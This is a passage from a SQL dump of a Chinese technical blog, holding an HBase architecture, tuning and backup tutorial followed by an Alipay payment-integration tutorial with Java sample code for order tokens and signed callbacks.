一个大Table有几百个Region,需要计算某列的平均值或者总和\r\n\r\n## 原理架构\r\n![hbase1.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544846971_hbase1.png)\r\n#### HMaster\r\n1. HMaster是HBase主/从集群架构中的中央节点\r\n2. HMaster将region(*HBase存储的最小单元,HBase表格的基本单位*)分配给RegionServer,协调RegionServer的负载并维护集群的状态\r\n3. 维护表和Region的元数据,不参与数据的输入/输出过程\r\n\r\n#### RegionServer\r\n1. 维护HMaster分配给他的region,处理对这些region的io请求\r\n2. 负责切分正在运行过程中变的过大的region\r\n\r\n#### Zookeeper\r\n1. Zookeeper是集群的协调器\r\n2. HMaster启动将系统表加载到Zookeeper\r\n3. 提供HBase RegionServer状态信息 \r\n\r\n#### 分别做什么\r\n1. HMaster不直接参与数据写\r\n2. RegionServer管理着Region,参与数据的读写\r\n3. 客户端如果想要访问HBase只需要知道zookeeper的地址就可以了\r\n\r\n### HBase启动过程\r\n1. HMater启动,连接Zookeeper,将自己*注册到Zookeeper*的一个backup节点,等待RegionServer汇报\r\n2. 所有RegionServer*将自己注册到Zookeeper*,并向HMaster通知\r\n3. HMater对各个RegionServer(包括失效的)的数据进行整理,分配Region和meta信息\r\n4. meta表中记录了所有表相关的Region还有各个RegionServer到底负责哪些数据等等\r\n5. HMaster将meta表将meta信息表交给Zookeeper \r\n\r\n#### 为什么HMater要写入backup节点?\r\n1. 集群情况下,需要利用zookeeper来作选举策略,成为主master\r\n\r\n#### 如何保证hbase集群下信息一致\r\n1. 未抢到backup节点的从salve,将长连接与主mater进行数据同步\r\n\r\n#### 当RegionServer失效后会发生什么,它如何保证数据依然是可读可写的?\r\n1. Zookeeper定期检查发现有RegionServer失效了,汇报给HMaster\r\n2. HMaster将失效RegionServer上的Region分配到其他节点\r\n3. HMaster在meta信息表中把失效的RegionServer删除,将失效RegionServer所负责的数据交给另一个正常的RegionServer,将更新之后的meta信息表更新到Zookeeper中\r\n\r\n#### 当HMaster失效后会发生什么,如果配置高可用会发生?没有配置高可用又会发生什么?\r\n1. 处于待命状态的从slave推选出一个转为Active状态,成为主master\r\n2. 当没有集群高可用情况下,RegionServer依旧可以处理读写数据,但是无法修改表结构或新建新表,会抛出HMaster不存在异常\r\n\r\n### 读写过程\r\n#### 读流程\r\n![hbaseread.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544846971_hbaseread.png)\r\n1. Client会先访问zookeeper,得到对应的RegionServer地址\r\n2. Client对RegionServer发起读请求\r\n3. 当RegionServer收到Client的读请求后,先扫描自己的Memstore,再扫描BlockCache(加速读内容缓存区)如果还没有找到则StoreFile中读取数据,然后将数据返回给Client\r\n4. 客户端请求数据时,只需要知道zookeeper的地址就可以了,这部分与HMaster没有关系,也不需要提前知道RegionServer的ip \r\n\r\n#### 写流程\r\n![hbasewrite.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544846971_hbasewrite.png)\r\n1. Client会先访问zookeeper,得到对应的RegionServer地址\r\n2. Client对RegionServer发起写请求,RegionServer接受数据写入内存\r\n3. 当MemStore的大小达到一定的值后,flush到StoreFile并存储到HDFS \r\n\r\n#### 缓存写入\r\n![hbasewrite2.png](http://blog.img.tuwq.cn/upload/artimg/2018/12/1544846971_hbasewrite2.png)\r\n4. RegionServer处理数据的输入输出请求,RegionServer中管理多个Region,*每个Region都有对应的RegionLog实例*,*Region是存储HBase的基本单元*,数据都存储在Region当中,每一个Region只存储一个列族的数据,而且只是这个列族的一部分\r\n5. 当Region的大小达到某个预值之后,会根据rowkey的排序划分为多个Region,而每个Region里面又包含多个store对象,每一个store对象里面包含一共MemStore和一个或多个的StoreFile\r\n6. MemStore便是数据在内存中的实体,并且一般是有序的\r\n7. 当有数据写入的时候,*先写入到MemStore*\r\n8. 当MemStore的大小达到上限之后,store会创建storeFile,这里的storeFile便是HFile的一层封装\r\n9. HFile存储在HDFS上,所以MemStore数据最终会写入到HFile当中 \r\n\r\n#### HBase如何保证内存中的数据不会丢失?\r\n1. Hlog,Hlog是wal的一种实现,wal是预写日志,是事务机制中常见的一致性实现方式\r\n2. 每个RegionServer都有一共Hlog的实例,RegionServer会将更新操作记录到MemStore,然后更新到Hlog当中,只有当更新Hlog完成之后,这条记录才算真正成功的写入,这样即使MemStore中的数据丢失了,还是可以通过Hlog找回来\r\n3. 一般的wal预先日志是先写入日志再写入内存的,HBase是先写入内存再写入日志,依托mvcc模式(并发控制)确保一致性\r\n4. MVCC会保存某个时间点上的数据快照。这意味着事务可以看到一个一致的数据视图，不管他们需要跑多久。这同时也意味着不同的事务在同一个时间点看到的同一个表的数据可能是不同的。\r\n\r\n#### HFile丢失怎么办?\r\n1. HFile存储在HDFS上,默认的备份是三份,所以并不考虑HFile丢失的可能性\r\n\r\n#### 为什么Client只需要知道访问zookeeper就可以?\r\n1. HMater启动时会把信息表加载到zookeeper,这个信息表存储了HBase所有的表所有Region的详细信息。比如:Region开始的key,结束的key、所在RegionServer的地址\r\n2. HBase的meta信息表相当于是一个目录,通过它可以快速的定位到数据的实际位置.所以读写操作只需要和Zookeeper和对应的RegionServer进行交互就可以了\r\n3. HMaster只负责维护Table和Region的源数据信息,协调各个RegionServer,所以它的负载就小了很多\r\n\r\n## 优化\r\n### 优化原因\r\n#### 什么导致HBase性能下降\r\n1. Jvm内存分配与GC回收策略(每个Java程序都要进行调优)\r\n2. 与HBase运行机制相关的部分配置不合理\r\n3. 表结构设计及用户使用方式不合理\r\n4. compaction和split\r\n\r\n#### compact合并\r\n1. HBase写入时当Memstore达到一定的大小会flush到磁盘保存成HFile,当HFile小文件太多会执行compact操作进行合并\r\n2. 当每个Memstore仅当包含一个文件的时候,查询效率才是最大的。因为小文件过多,查询时需要的*寻址时间就会越长*\r\n3. 因此HBase会通过合并已有的HFilel来减少每次读取数据时的磁盘寻道时间从而提高读取的速度,这个*合并的过程叫做compact。*\r\n4. 但是当执行compact的期间,就可能会阻塞数据的写入和读取,那么何时去执行compact是一个相当复杂的决策。\r\n5. 执行compact的时候要选择哪些文件,选择哪些合适的线程池才能达到最大的性能,这是个非常*重要的决策*\r\n\r\n#### HBase何时会执行compaction操作?\r\n- MemStore被flush到磁盘\r\n- 用户执行shell命令compact、major_compact或者调用了相应的API\r\n- HBase后台线程周期性的触发检查  \r\n\r\n#### split拆分\r\n1. 当Region的大小达到某一阀值之后,会执行split操作,将Region进行分割,分配到不同的RegionServer进行管理,这里也是一个非常消耗资源的操作。期间性能也不会太高,可能会导致当前Region不能读取也不能写入,这两种情况都是在生产环境下必须去考虑的\r\n\r\n#### hbase耗时行为\r\n1. *minorCompaction*: 选取一些小的,相邻的StoreFile将它们合并成一个更大的StoreFile\r\n2. *majorCompaction*: 将所有的StoreFile合并成一共StoreFile,清理无意义数据: 被删除的数据、TTL过期数据、版本号超过设定版本号的数据\r\n3. *split*: 当一共Region达到一定的大小就会自动split成两个Region\r\n4. MemStore会flush到磁盘,MemStore过多会执行compact,Region过大会执行split操作\r\n\r\n### 客户端优化\r\n1. Jvm设置与GC设置\r\n2. hbase-site.xml部分属性配置\r\n\r\n#### JVM主要属性\r\n1. -Xms: 堆初始值\r\n2. -Xmx: 堆最大可用值\r\n3. -XX:+PermSize: 非堆区初始内存分配大小(方法区,永久区)\r\n4. -XX:newSize: 新生代初始内存的大小\r\n5. -XX:SurvivorRatio: 设置新生代中eden空间和from/to空间的比例\r\n6. -XX:NewRatio: 配置新生代与老年代占比\r\n7. -XX:MaxTenuringThreshold: 进入老年代所需要的年龄\r\n\r\n##### 要减少GC垃圾回收次数,堆的初始值和堆的最大值一定要一致,初始堆值和最大堆内存内存越大,吞吐量就越高\r\n\r\n\r\n\r\n#### hbase-site.xml中重要属性\r\n- *hbase.regionserver.handler.count*: rpc请求的线程数量,默认值是10\r\n- *hbase.hregion.max.filesize*: 当region的大小大于设定值后,hbase就会开始split\r\n- *hbase.hregion.majorcompaction*: majorCompaction的执行周期(建议设置为0,*禁止自动的majorcompaction*,在生产集群当中,执行majorcompactiond的时间可能会数小时之久,为了减少对业务的影响,建议在业务低峰的时候进行手动的合并或者通过脚本API定义执行majorcompaction)\r\n- *hbase.hstore.compaction.min*:一个store里的storefile总数超过该值,会触发默认的合并操作\r\n- *hbase.hstore.compaction.max*:一次最多合并多少个storefile\r\n- *hbase.hstore.blockingStoreFiles*: 一个region中的Store(ColumnFamily)内有超过xx个storefile时,则block所有的写请求进行compaction\r\n- *hfile.block.cache.size*: regionServer的blockCache的内存大小限制\r\n- *hbase.hregion.memstore.flush.size*: memstore超过该值将被flush\r\n- *hbase.region.memstore.block.multiplier*: 如果memstore的内存大小超过flush.size * multiplier,会阻塞该memstore的写操作\r\n\r\n##### 通过*合理配置这些属性*,使我们的集群合理的执行compaction和split操作,这样才能使HBase的性能更加高效,一般我们都会手动执行majorcompaction和split操作,来减少我们对业务的一些影响,或者根据业务的高峰低峰开发定时的脚本去执行majorcompaction和split操作 \r\n\r\n\r\n### HBase服务端优化\r\n1. 常见服务端配置优化(hbase-site.xml中的属性)\r\n2. 常用的优化策略(以实际需求为主)\r\n3. HBase读/写性能优化\r\n\r\n#### 预先分区\r\n1. HBase在建表时,默认只在一个RegionServer上建立一个Region分区,写数据全部写入这个Region里面,当Region达到一定大小的时候再进行split操作,将其分割成两个Region,然后进行负载均衡\r\n2. Region的Split操作是非常耗时的,而且会造成Region暂时无法访问的情况,所以说在建表的时候预先创建一些空的Regions并且规定好每个Region存储的RowKey的范围,指定范围内的数据就被写入到指定的Region里面,可以减少很多的IO操作,而且通过预先分区可以有效的解决HBase中数据请协问题,我们可以把平常访问的数据放到多个Region当中,将不常访问的数据放到一个或几少个Region当中,解决请协问题\r\n\r\n#### RowKey优化\r\n1. HBase是三维存储的,我们通过RowKey、ColumnKey、TimeStamp。三个维度可以对HBase中的数据进行快速的定位\r\n2. HBase当中的RowKey可以唯一标识一行记录,在HBase进行查询的时候有两种方式,一种是GET操作,可以根据RowKey获取到某条记录,一种是通过setStartRow和setStopRow之间范围的查询,所以说RowKey的设计直接影响到范围查询和检索效率\r\n3. 利用HBase默认排序特点,将一起访问的数据放到一起\r\n4. 防止热点问题,避免使用时序或者单调的递增递减等(一般解决是通过加盐,哈希,反转等方式解决)\r\n5. 符合唯一原则,长度要尽可能的短,RowKey过长对于RegionServer的内存和磁盘都是一共比较大的消耗。\r\n\r\n#### Column优化\r\n1. ColumnFamily和ColumnQualifier都需要消耗内存,所以列族的名称和列后缀命令尽量简短\r\n2. HBase对多列族的性能支持并不好,所以同一张表中的ColumnFamily的数量不要超过三个\r\n\r\n#### Schema优化\r\n1. 宽表: 一种\"列多行少\"\\[事务性更好,因为HBase的事务是建立在行的基础上的,宽表上一个行有多个列,所以对于一行多列插入的时候,可以有效的保证事务性,而高表是多个行,多个行进行更新的时候,没有事务性的保障\\]\r\n2. 高表: 一种\"列少行多\"\\[查询性能更好,因为查询的条件可以放到RowKey当中,一行的数据也更少,缓存也可以缓存更多的行,以行数为单位的吞吐量,高表要比宽表高的多\\]\\(对源数据的开销要讲,高表的源数据开销就大了,因为行比较多,RowKey就比较多,Region也会比较多\\)\r\n3. 设计表的时候也不必要苛刻的去追求高表宽表而是要根据业务场景去达到平衡的状态,这样效率才会高\r\n\r\n### 写流程优化\r\n1. 同步批量提交或异步批量提交(可能会丢失数据)\r\n2. WAL优化,是否必须,持久化等级\r\n\r\n##### WAL预写日志,一方面是为了保证数据写入成功,缓存丢失了也可以进行数据恢复,另一方面是为了集群之间的异步复制,HBase集群默认WAL机制是开启的,如果业务允许对于异常情况下的部分数据丢失可以忍受,更关心写入的吞吐量,这种情况下可以考虑关闭WAL或者采用WAL的异步写入,这样操作都可以对HBase的写入性能带来大提升,但对数据的完整性都有损失\r\n\r\n### 读流程优化\r\n#### 客户端: Scan缓存设置,批量获取\r\n1. 设置scan检索时可以设置Scan的cache,通常来讲,一次scan会返回大量的数据,客户端去发起scan请求的时候,实际上并不会一次将所有的数据都加载到本地,而是分成多次RPC请求进行加载,这一设计的用意在于,大量的数据请求可能会导致网络带宽严重消耗,进而影响到其他的业务。另一方面可能因为数据量太大,导致客户端发生内存溢出。\r\n2. 在这样的设计体系下,客户端会首先加载一部分数据到本地,然后在进行遍历处理,在下载一部分数据到本地处理,如何循环,直到所有数据都加载完成,数据加载完成之后就会存储到scan的缓存里面,默认是100条的大小。\r\n3. 如何数据量比较大,可以将cache设置值更大,减少RPC的请求\r\n4. HBase支持RowKey值进行索引,如果一个表中有多个列族,多个列族其实存在不同的Region里面,如果不去指定列族去检索的话,那么性能会降低\r\n\r\n#### 服务端: BlockCache配置是否合理,HFile是否过多\r\n1. 如果服务端BlockCache缓存每次不能有效命中,那么对于读性能的影响还是比较大的,这个时候需要考虑BlockCache配置是否合理\r\n2. BlockCache不能有效命中,那么需要从HFile里进行读取,这时HFile的数量对于读性能的影响又是比较大的\r\n- 表结构的设计问题\r\n3. 根据具体的业务场景对表进行优化,这样才能使读取性能更加的高效 \r\n\r\n## 备份\r\n### CopyTable\r\n1. 支持时间区间、row区间、改变表名称、改变列族名称、指定是否copy已经被删除的数据等功能,也可以支持跨集群的拷贝表 \r\n2. CopyTable工具采用scan查询,写入新表时采用put和delteAPI,全是基于hbase的clientApi进行读写\r\n\r\n```shell\r\n// 假设需要备份testTable表 \r\nhbase shell // 进入hbase\r\nlist	// 查看所有表\r\nscan \'tableTest\' // 查看列族,假设查看出来有列族 cf\r\ncreate \'copyTableTest\',\'cf\' // 创建一个相同列族结构的表\r\nhbase org.apache.hadoop.hbase.mapreduce.CopyTable --new.name=copyTableTest tableTest    // 执行拷贝\r\nscan copyTableTest	// 查看是否以copy完成\r\n```\r\n\r\n### Export/Import\r\n1. Export可导出数据到目标集群,然后可在目标集群Import导入数据,Export支持开始时间和结束时间,因此可以做增量备份\r\n2. Export导出工具与copyTableTest一样是依赖hbase的scan读取数据\r\n\r\n```shell\r\n// 导出\r\nhbase org.apache.hadoop.hbase.mapreduce.Export tableTest /usr/hbase/bak/tableTestBak.db  \r\n// 查看是否导出成功\r\nhdfs dfs -ls /usr/hbase/bak/\r\n// 清空表数据\r\ntruncate \'copyTableTest	\'\r\n// 查看表数据\r\nscan \'copyTableTest\'\r\n// 导入\r\nhbase org.apache.hadoop.hbase.mapreduce.Import copyTableTest /usr/hbase/bak/tableTestBak.db\r\n```\r\n\r\n### Snapshot\r\n1. snapshot即为快照,作用于表上。通过配置hbase-site.xml开发该功能\r\n##### 添加hbase.snapshot.enabled=>true\r\n2. 可以快速的恢复表至快照指定的状态从而迅速的修复数据(会丢失快照之后的数据)\r\n```shell\r\n# 所有快照\r\nlist_snapshots\r\n# 创建快照\r\nsnapshot \'tableTest\',\'tableTest-180223\'\r\n# 克隆快照\r\nclone_snapshot \'tableTest-180223\',\'tableTest-222222\' \r\n# 列出快照\r\nlist_snapshots\r\n# 删除快照\r\ndelete_snapshots \'tableTest-180223\'\r\n# 恢复数据\r\ndisable \'tableTest\'\r\nrestore_snapshot \'tableTest-180223\'\r\n```\r\n\r\n### Replication\r\n1. 可以通过replication机制实现hbase集群的主从模式。通过配置hbase-site.xml开发该功能\r\n##### hbase.replication=>true\r\n\r\n```shell\r\n# 在源集群及目标集群都创建同名表\r\n# 指定目标集群zk地址和路径\r\nadd_peer \'1\',\"zo01:2181:/hbase/backup\"\r\n# 标注需要备份的列族信息及备份的目标库地址\r\n# REPLICATION_SCOPE值为上面的app_peer指定的值\r\n# 首先要先将原集群的表禁用掉\r\ndisable \'replication_source_table\'\r\nalter \'replication_source_table\',{NAME=> \'f1\',REPLICATION_SCOPE=>\'1\'}\r\n// 启动表\r\nenable \'replication_source_table\'\r\n```\r\n2. 经过操作后会发现,当我们在原集群当中去插入一条数据的时候,在目标集群中也会插入这条数据\r\n3. Replication是依赖WAL日志进行同步,没有开启HBase的WAL预写日志,那么Replication实际上是不生效的', 0, 0, 52, 0, 0, '2018-10-23 15:57:35', '2019-02-22 00:23:16', 0, 0);
INSERT INTO `article` VALUES (32, 1, '支付宝流程', '2019/1/1546592993_F5746A11DAF6D63F5DEA0E5FA892342B.jpg', '## 概念\r\n### 支付宝是什么\r\n1. 支付宝（中国）网络技术有限公司是国内的第三方支付平台，致力于提供“简单、安全、快速”的支付解决方案\r\n2. 支付宝与微信成为当下中国人民最受捧的网络支付平台\r\n\r\n### 支付宝的流程\r\n#### 整体流程\r\n![zhifubaoliucheng.png](http://blog.img.tuwq.cn/upload/artimg/2019/1/1546658584_zhifubaoliucheng.png)\r\n#### 大致所需步骤\r\n1. 用户点击支付商品\r\n2. 获取商品信息并生成订单和支付信息插入表中,设置未支付状态\r\n3. 生成支付的token,放入Redis中,(key: token, value: 支付信息id),放入redis已防止用户下单却不买,白白浪费库存\r\n4. 根据token获取支付信息并生成支付宝的支付链接(html)给页面\r\n5. 用户付款后由支付宝进行处理\r\n6. 支付宝处理完毕,*同步通知*支付结果\r\n7. 将同步通知的支付结果告诉给用户\r\n8. 支付宝处理完毕,*异步通知*支付结果\r\n9. *处理幂等性问题,订单信息是否正确问题,一切可能会出现漏洞的问题*\r\n10. 修改数据库中的订单和支付信息状态,*一定要处理好数据一致性*\r\n11. 一切处理完毕,返回支付宝正确的反馈\r\n\r\n#### 为什么要用token,而且存在Redis中\r\n1. 为了防止用户恶意下单却不买商品,而库存却白白减少了\r\n2. 提醒用户支付时间,提高用户体验\r\n\r\n#### 为什么不在支付宝的同步通知中处理业务\r\n1. 支付宝同步通知只有一次,不会像异步通知一样有*重试机制*\r\n2. 异步通知难以被抓包,增强安全问题\r\n\r\n#### 为什么第九步处理很重要 \r\n1. 支付宝若未及时得到成功反馈,那么一天中会有八次异步通知回调\r\n2. 若未处理幂等性问题,那么将会发生*重复消费问题*\r\n\r\n#### 重复消费问题\r\n1. 用户充值了648元后,由于没有处理幂等性问题,*当支付宝又出现重试时,那么业务会正常的再次执行一遍*,这样用户相当于充值了1296元\r\n2. 会对业务造成巨大的财产损失\r\n\r\n#### 极端情况下要使用分布式锁\r\n1. 极低的几率下,由于网络延迟等各种原因代码迟迟执行\r\n2. 支付宝的回调与正在处理幂等性的代码擦肩而过,那么第二次依旧会正常执行,幂等性无法保证在如此极低几率的情况\r\n3. 视情况采用分布式锁,*一定要详细记录日志*\r\n\r\n#### 为什么第十步处理很重要\r\n1. 此处修改支付状态时,若出现宕机或错误信息,一定需要保证*数据一致性*\r\n2. 有可能成功修改订单的支付状态,正当要修改支付信息的支付状态时出现宕机或接口崩溃,这将会造成数据不一致\r\n3. 分布式情况下,不借助*分布式事务解决*,*那么将无法回滚已调用的远程服务接口*\r\n\r\n## 步骤实现\r\n### 引包\r\n```xml\r\n<!-- 这个jar包里包含了支付宝,微信,银联等支付API-->\r\n<dependency>					\r\n	<groupId>com.github.1991wangliang</groupId>\r\n	<artifactId>alipay-sdk</artifactId>\r\n	<version>1.0.0</version>\r\n</dependency>\r\n``` \r\n### 配置支付宝参数\r\n```java\r\n/* *\r\n *类名：AlipayConfig\r\n *功能：基础配置类\r\n *详细：设置帐户有关信息及返回路径\r\n *修改日期：2017-04-05\r\n *说明：\r\n *以下代码只是为了方便商户测试而提供的样例代码，商户可以根据自己网站的需要，按照技术文档编写,并非一定要使用该代码。\r\n *该代码仅供学习和研究支付宝接口使用，只是提供一个参考。\r\n */\r\n\r\npublic class AlipayConfig {\r\n	\r\n//↓↓↓↓↓↓↓↓↓↓请在这里配置您的基本信息↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓\r\n\r\n	// 应用ID,您的APPID，收款账号既是您的APPID对应支付宝账号\r\n	public static String app_id = \"\";\r\n	\r\n	// 商户私钥，您的PKCS8格式RSA2私钥\r\n    public static String merchant_private_key = \"\";\r\n	\r\n	// 支付宝公钥,查看地址：https://openhome.alipay.com/platform/keyManage.htm 对应APPID下的支付宝公钥。\r\n    public static String alipay_public_key = \"\";\r\n\r\n	// 服务器异步通知页面路径  需http://格式的完整路径，不能加?id=123这类自定义参数，必须外网可以正常访问\r\n	public static String notify_url = \"\";\r\n\r\n	// 页面跳转同步通知页面路径 需http://格式的完整路径，不能加?id=123这类自定义参数，必须外网可以正常访问\r\n	public static String return_url = \"\";\r\n\r\n	// 签名方式\r\n	public static String sign_type = \"RSA2\";\r\n	\r\n	// 字符编码格式\r\n	public static String charset = \"utf-8\";\r\n	\r\n	// 支付宝网关\r\n	public static String gatewayUrl = \"\";\r\n	\r\n	// 支付宝网关\r\n	public static String log_path = \"C:\\\\\";\r\n\r\n\r\n//↑↑↑↑↑↑↑↑↑↑请在这里配置您的基本信息↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑\r\n}\r\n```\r\n### 点击商品后创建订单并返回token\r\n```java\r\n/**\r\n	 * 创建支付信息与订单\r\n	 * 生成对应支付token\r\n	 * 存放在Redis中,key为token,value为支付id\r\n	 * 分布式情况下此处需要注意数据一致性问题\r\n	 * 返回支付token\r\n	 */\r\n	@Override\r\n	public ResponseBase createToken(@RequestBody Command comand) {\r\n		// 新建订单与支付信息,并设置为未支付状态\r\n		Order order = new Order(command);\r\n		PayMement payInfo = new PayMementInfo(command);\r\n		order.setPayStatus(0);\r\n		payInfo.setPayStatus(0);\r\n		this.orderDao.saveOrder(order);\r\n		this.paymentInfoDao.savePaymentInfo()\r\n		// 生成token并放入redis,最后返回token\r\n		String payToken = TokenUtils.getPayToken();\r\n		this.baseRedisService.setString(payToken, paymentInfo.getId()+\"\", HttpConstants.PAY_TOKEN_MEMBER_TIME);\r\n		JSONObject data = new JSONObject();\r\n		data.put(\"payToken\", payToken);\r\n		return this.setResultSuccess(data);\r\n	}\r\n```\r\n### 利用token获取信息并生成支付宝支付链接(html)\r\n```java\r\n/**\r\n	 * 使用支付令牌查找支付信息\r\n	 * 参数验证\r\n	 * 判断token有效期\r\n	 * 使用token查找redis 找到对应支付id\r\n	 * 使用支付id进行下单\r\n	 * 对接支付宝代码\r\n	 */\r\n	@Override\r\n	public ResponseBase findPayToken(@RequestParam(\"payToken\") String payToken) {\r\n		if (StringUtils.isEmpty(payToken)) {this.setResultError(\"payToken不能为空\");}\r\n		String payId = (String) this.baseRedisService.getString(payToken);\r\n		if (StringUtils.isEmpty(payId)) {this.setResultError(\"支付时间已过期\");}\r\n		Long payID = Long.parseLong(payId);\r\n		PaymentInfo paymentInfo = paymentInfoDao.getPaymentInfo(payID);\r\n		if (paymentInfo == null) {return setResultError(\"未找到支付信息\");}\r\n		\r\n		// 支付宝对接\r\n		// 对接支付代码 返回提交支付from表单元素给客户端\r\n		// 获得初始化的AlipayClient\r\n		AlipayClient alipayClient = new DefaultAlipayClient(AlipayConfig.gatewayUrl, AlipayConfig.app_id,\r\n				AlipayConfig.merchant_private_key, \"json\", AlipayConfig.charset, AlipayConfig.alipay_public_key,\r\n				AlipayConfig.sign_type);\r\n		AlipayTradePagePayRequest alipayRequest = new AlipayTradePagePayRequest();\r\n		alipayRequest.setReturnUrl(AlipayConfig.return_url);\r\n		alipayRequest.setNotifyUrl(AlipayConfig.notify_url);\r\n\r\n		// 商户订单号，商户网站订单系统中唯一订单号，必填\r\n		String out_trade_no = paymentInfo.getOrderId();\r\n		// 付款金额，必填 企业金额,以分为单位\r\n		String total_amount = paymentInfo.getPrice() + \"\";\r\n		// 订单名称，必填\r\n		String subject = \"购买会员金币\";\r\n		\r\n		// 商品描述，可空\r\n		// String body = new\r\n		// String(request.getParameter(\"WIDbody\").getBytes(\"ISO-8859-1\"),\"UTF-8\");\r\n\r\n		alipayRequest.setBizContent(\"{\\\"out_trade_no\\\":\\\"\" + out_trade_no + \"\\\",\" + \"\\\"total_amount\\\":\\\"\" + total_amount\r\n				+ \"\\\",\" + \"\\\"subject\\\":\\\"\" + subject + \"\\\",\"\r\n				// + \"\\\"body\\\":\\\"\"+ body +\"\\\",\"\r\n				+ \"\\\"product_code\\\":\\\"FAST_INSTANT_TRADE_PAY\\\"}\");\r\n		\r\n		// 请求\r\n		try {\r\n			String result = alipayClient.pageExecute(alipayRequest).getBody();\r\n			JSONObject data = new JSONObject();\r\n			data.put(\"payHtml\", result);\r\n			return this.setResultSuccess(data);\r\n		} catch (Exception e) {\r\n			return setResultError(\"支付异常\");\r\n		}\r\n	} \r\n```\r\n### 返回给页面支付宝链接\r\n```java\r\n// 设置返回格式\r\nresponse.setContentType(\"text/html;charset=utf-8\")\r\nPrintWriter writer = response.getWriter();\r\nString payHtml = (String) data.get(\"payHtml\");\r\n// 向页面渲染支付宝链接\r\nwriter.println(payHtml);\r\nwriter.close();\r\n```\r\n### 同步通知\r\n```java\r\n	// 同步通知,最后作一个参数隐藏转发,支付宝回调是get请求,会暴露参数到地址栏上,不安全\r\n	@RequestMapping(\"/syncCallBack\")\r\n	public void syncCallBack(HttpServletRequest request, HttpServletResponse response) throws IOException {\r\n		log.info(\"支付宝同步回调controller开始\");\r\n		Map<String,String> params = new HashMap<String,String>();\r\n		Map<String,String[]> requestParams = request.getParameterMap();\r\n		for (Iterator<String> iter = requestParams.keySet().iterator(); iter.hasNext();) {\r\n			String name = (String) iter.next();\r\n			String[] values = (String[]) requestParams.get(name);\r\n			String valueStr = \"\";\r\n			for (int i = 0; i < values.length; i++) {\r\n				valueStr = (i == values.length - 1) ? valueStr + values[i]\r\n						: valueStr + values[i] + \",\";\r\n			}\r\n			//乱码解决，这段代码在出现乱码时使用\r\n			valueStr = new String(valueStr.getBytes(\"ISO-8859-1\"), \"utf-8\");\r\n			params.put(name, valueStr);\r\n		}\r\n		ResponseBase syncCallBackResult = this.callBackServiceFeign.syncCallBack(params);\r\n		if (!syncCallBackResult.getRtnCode().equals(HttpConstants.HTTP_RES_CODE_200)) {\r\n			return;\r\n		}\r\n		LinkedHashMap data = (LinkedHashMap) syncCallBackResult.getData();\r\n		// 商户订单号\r\n		String outTradeNo = (String) data.get(\"outTradeNo\");\r\n		// 支付宝交易号\r\n		String tradeNo = (String) data.get(\"tradeNo\");\r\n		// 付款金额\r\n		String totalAmount = (String) data.get(\"totalAmount\");\r\n		PrintWriter writer = response.getWriter();\r\n		response.setContentType(\"text/html;charset=utf-8\");\r\n		// 封装成html表单 浏览器加载后立刻模拟去提交\r\n		String htmlFrom=\"<form name=\'punchout_form\' \"\r\n				+ \"method=\'post\' \"\r\n				+ \"action=\'http://127.0.0.1/alibaba/callBack/syncSuccessPage\' >\"\r\n				+ \"<input type=\'hidden\' name=\'outTradeNo\' value=\'\"+outTradeNo+\"\'>\"\r\n				+ \"<input type=\'hidden\' name=\'tradeNo\' value=\'\"+tradeNo+\"\'>\"\r\n						+ \"<input type=\'hidden\' name=\'totalAmount\' value=\'\"+totalAmount+\"\'>\"\r\n								+ \"<input type=\'submit\' value=\'立即支付\' style=\'display:none\'>\"\r\n								+ \"</form>\"\r\n								+ \"<script>document.forms[0].submit();</script>\";\r\n		writer.println(htmlFrom);	\r\n		log.info(\"支付宝同步回调controller结束\");\r\n	};	\r\n	\r\n	// 已Post表达隐藏参数\r\n	@PostMapping(\"/syncSuccessPage\")\r\n	public String syncSuccessPage(HttpServletRequest request, String outTradeNo, String tradeNo, String totalAmount) {\r\n		// 商户订单号\r\n		request.setAttribute(\"outTradeNo\", outTradeNo);\r\n		// 支付宝交易号\r\n		request.setAttribute(\"tradeNo\", tradeNo);\r\n		// 付款金额\r\n		request.setAttribute(\"totalAmount\", totalAmount);\r\n		return PAY_SUCCESS;\r\n	} \r\n```\r\n### 异步通知\r\n```java\r\n	log.info(\"支付宝异步回调controller开始\");\r\n	Map<String,String> params = new HashMap<String,String>();\r\n	Map<String,String[]> requestParams = request.getParameterMap();\r\n	for (Iterator<String> iter = requestParams.keySet().iterator(); iter.hasNext();) {\r\n		String name = (String) iter.next();\r\n		String[] values = (String[]) requestParams.get(name);\r\n		String valueStr = \"\";\r\n		for (int i = 0; i < values.length; i++) {\r\n			valueStr = (i == values.length - 1) ? valueStr + values[i]\r\n						: valueStr + values[i] + \",\";\r\n		}\r\n		// post不会有乱码情况的\r\n		// valueStr = new String(valueStr.getBytes(\"ISO-8859-1\"), \"utf-8\");\r\n		params.put(name, valueStr);\r\n	}\r\n	String asyncCallBackResult = this.callBackServiceFeign.asyncCallBack(params);\r\n	log.info(\"支付宝异步回调controller结束\");\r\n	return asyncCallBackResult;\r\n```\r\n```java\r\n/**\r\n	 * 漏洞: 幂等性,金额问题,记录日志\r\n	 * 分布式情况下分布式锁\r\n	 * 单点应用情况下synchronized\r\n	 */\r\n	@Override\r\n	public String asyncCallBack(@RequestParam Map<String, String> params) {\r\n		try {\r\n			log.info(\"####异步回调service开始####params:\", params);\r\n			boolean signVerified = AlipaySignature.rsaCheckV1(params, AlipayConfig.alipay_public_key,\r\n					AlipayConfig.charset, AlipayConfig.sign_type); // 调用SDK验证签名\r\n			// ——请在这里编写您的程序（以下代码仅作参考）——\r\n			if (!signVerified) {\r\n				// rsa加密签名错误\r\n				return \"fail\";\r\n			}\r\n			\r\n			// 商户订单号\r\n			String outTradeNo = params.get(\"out_trade_no\");\r\n			// 寻找支付信息\r\n			PaymentInfo paymentInfo = this.paymentInfoDao.getByOrderIdPayInfo(outTradeNo);\r\n			if (paymentInfo == null) { return HttpConstants.PAY_FAIL;}\r\n			Integer state = paymentInfo.getState();\r\n			// 是否已做过处理,全局唯一id处理幂等性\r\n			if (state == 1) { return \"success\";}\r\n			// 支付宝交易号\r\n			String tradeNo = params.get(\"trade_no\");\r\n			// 付款金额\r\n			String totalAmount = params.get(\"total_amount\");\r\n			if (!paymentInfo.getPrice().equals(totalAmount)) {\r\n				// 金额不正确,异常订单,记录日志并退钱给用户\r\n			}\r\n			/* 修改支付信息数据库 修改订单状态*/\r\n			paymentInfo.setState(1);\r\n			// // 支付宝的账单证明信息\r\n			